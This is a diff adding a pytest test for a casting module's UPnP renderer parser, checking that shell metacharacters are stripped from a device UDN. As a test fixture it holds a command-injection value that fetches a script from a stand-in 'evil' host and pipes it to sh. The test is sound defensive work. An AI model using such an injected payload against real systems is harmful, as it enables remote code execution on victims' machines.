@@ -46,6 +46,23 @@ def test_describe_renderer_parses_services(cast, monkeypatch):
     assert "\t" not in dev["name"]
 
 
+def test_describe_renderer_strips_shell_metacharacters_from_udn(cast, monkeypatch):
+    # A hostile LAN renderer whose UDN carries a shell payload: the udn
+    # becomes a device key that reaches a shell sentinel on the QML side.
+    # Anything outside the allowlist is stripped here, and the QML boundary
+    # rejects whatever slips past — so the payload can never form a command.
+    evil = RENDERER_XML.replace(
+        "<UDN>uuid:abc-123</UDN>",
+        "<UDN>uuid:abc;$(curl -s http://evil|sh);:</UDN>")
+    monkeypatch.setattr(cast, "_http_get", lambda url, timeout=3.0: evil.encode())
+    dev = cast._describe_renderer("http://192.0.2.1:8080/dd.xml")
+    assert dev is not None
+    for ch in ";$()|&`<> ":
+        assert ch not in dev["udn"], f"{ch!r} survived into the udn"
+    # The legitimate characters of a real UDN are kept.
+    assert dev["udn"] == "uuid:abccurl-shttp:evilsh:"
+
+
 def test_describe_renderer_honors_urlbase(cast, monkeypatch):
     xml = RENDERER_XML.replace(
         "<device>",
